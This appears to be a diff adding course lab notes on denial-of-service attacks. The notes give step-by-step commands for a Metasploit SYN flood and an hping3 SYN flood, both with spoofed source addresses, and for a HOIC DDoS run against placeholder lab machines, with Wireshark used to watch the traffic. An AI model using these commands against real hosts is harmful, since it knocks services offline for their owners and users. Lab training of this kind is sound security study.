@@ -1,0 +1,24 @@
+Module 10: Denial-of-Service
+
+SYN Flooding a Target Host Using Metasploit
+	nmap -p 21 [IP Address of target]
+	msfconsole
+	use auxiliary/dos/tcp/synflood
+	show options
+	Type set RHOST [IP Address of Windows 10]
+	Type set RPORT 21
+	Type set SHOST [IP Address of Windows Server 2016] (spoofed)
+	Type set TIMEOUT 20000
+	exploit
+	In Windows 10, wireshark filter tcp.port == 21
+	
+SYN Flooding a Target Host Using hping3
+	launch hping3, navigate to Applications, click 01 - Information Gathering node, click Live Host Identification and click hping3
+	hping3 -S [IP Address of Windows 10] -a [IP Address of Kali Linux] -p 22 --flood
+	In Windows 10, wireshark filter tcp.port == 22
+
+Performing Distributed Denial of Service Attack Using High Orbit Ion Cannon (HOIC)
+	Windows 2012, Windows 10 & Windows 8: Run HOIC as below.
+	[Target] + Type the target URL http://[IP Address of the target machine] in the URL field, slide the power bar to High, select GenericBoost.hoic booster from the drop-down list, and click Add. Set the THREADS value to 20.
+	FIRE TEH LAZER!
+	Observe traffic with Wireshark in victim machine.
